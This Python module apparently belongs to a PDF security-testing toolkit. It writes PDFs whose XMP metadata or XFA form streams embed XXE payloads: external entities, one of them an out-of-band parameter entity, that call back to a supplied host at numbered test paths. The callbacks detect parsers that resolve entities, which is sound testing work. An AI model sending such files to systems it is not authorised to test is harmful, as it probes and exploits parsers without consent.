"""XXE callback PDF generators."""

from __future__ import annotations

import base64
import bz2
import os
import re
import zlib

from lib.pdf.obfuscation import ensure_scheme

def write_xxe_xmp_metadata(filename, host):
    xmp_payload = (
        '<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY xxe SYSTEM "' + host + '/test36-xxe-xmp">\n'
        ']>\n'
        '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
        '  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
        '    <rdf:Description rdf:about="">\n'
        '      <dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">&xxe;</dc:title>\n'
        '    </rdf:Description>\n'
        '  </rdf:RDF>\n'
        '</x:xmpmeta>\n'
        '<?xpacket end="w"?>'
    )
    xmp_len = len(xmp_payload)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /Metadata 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xxe-xmp'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Metadata
     /Subtype /XML
     /Length ''' + str(xmp_len) + '''
  >>
stream
''' + xmp_payload + '''
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000090 00000 n
0000000191 00000 n
0000000460 00000 n
0000000580 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1200
%%EOF
''')


def write_xxe_xfa_acroform(filename, host):
    xfa_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY xxe SYSTEM "' + host + '/test37-xxe-xfa">\n'
        ']>\n'
        '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        '  <template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
        '    <subform name="form1">\n'
        '      <field name="f1"><value><text>&xxe;</text></value></field>\n'
        '    </subform>\n'
        '  </template>\n'
        '</xdp:xdp>'
    )
    xfa_len = len(xfa_payload)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /XFA 5 0 R >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xxe-xfa'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Length ''' + str(xfa_len) + ''' >>
stream
''' + xfa_payload + '''
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000100 00000 n
0000000201 00000 n
0000000470 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1100
%%EOF
''')


def write_xfa_xxe_oob(filename, host):
    xfa_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % xxe SYSTEM "' + host + '/test42-xxe-oob">\n'
        '  %xxe;\n'
        ']>\n'
        '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        '  <template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
        '    <subform name="form1">\n'
        '      <field name="f1"><value><text>oob</text></value></field>\n'
        '    </subform>\n'
        '  </template>\n'
        '</xdp:xdp>'
    )
    xfa_len = len(xfa_payload)
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /XFA 5 0 R >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xxe-oob-xfa') Tj
  ET
endstream
endobj

5 0 obj
  << /Length ''' + str(xfa_len) + ''' >>
stream
''' + xfa_payload + '''
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000100 00000 n
0000000201 00000 n
0000000470 00000 n
0000000590 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1100
%%EOF
''')
